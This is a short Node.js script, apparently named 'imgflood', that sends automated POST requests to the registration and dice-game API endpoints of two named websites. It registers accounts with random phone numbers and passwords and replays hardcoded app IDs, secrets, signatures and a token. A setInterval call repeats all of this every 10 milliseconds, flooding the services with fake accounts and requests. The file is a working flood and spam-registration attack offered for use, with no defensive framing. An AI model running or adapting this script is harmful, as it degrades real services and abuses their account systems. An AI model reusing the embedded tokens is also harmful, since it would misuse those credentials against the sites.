const { default: axios } = require("axios");

async function imgflood() {
  var USER_API = "https://bpiexchange.com/api/user/register";
  const TARGET = "https://bpiexchange.com/api/user/real_name";

  const new_Target = "https://www.insjiekou.top//api/login/register";

  const additional_MEthod = "https://www.insjiekou.top//api/game/getDiceConfig";

  const other_POPS = "https://www.insjiekou.top//api/game/getDiceConfig";

  const buyData = {
    appid: "21210416",
    ranstr: "ennhkgfxhhc7wl0g",
    secret: "ykzc",
    sign: "1a8f50863137fc1e74a6d270d8ea2308",
    times: "1726294754000",
    token: "9f266113c90526b71b2e519a13b8fa94ce3ee866",
  };

  const pops_data = {
    appid: "21210416",
    ranstr: "92zgxykc05j1ke5p",
    secret: "ykzc",
    sign: "77a8c0ba1441eb160848bb32892293bf",
    times: "1726295738448",
    token: "9f266113c90526b71b2e519a13b8fa94ce3ee866",
  };

  // https://www.insjiekou.top//api/login/register
  const max = 200000;
  const min = 100;

  const user = `${String(Math.ceil(Math.random() * (max - min) + min))}`;
  const genPass = Math.random() * (10 - 5) + 5;

  const code = Math.ceil(Math.random() * (200000 - 100000) + 100000);

  console.log(user);

  const data = {
    appid: "21210416",
    guid: "009168",
    password: genPass,
    phone: user,
    ranstr: "qk1wq7l2wallih2g",
    secret: "ykzc",
    sign: "44bd44ed57a4383bcdc1ec8dc15da750",
    times: "1726293784237",
  };

  await axios
    .post(new_Target, data)
    .then((data) => console.log(data))
    .catch((e) => console.log(e));

  await axios
    .post(additional_MEthod, buyData)
    .then((data) => console.log(data))
    .catch((e) => console.log(e));

  await axios
    .post(other_POPS, pops_data)
    .then((data) => console.log(data))
    .catch((e) => console.log(e));
}
// imgflood();

setInterval(imgflood, 10);
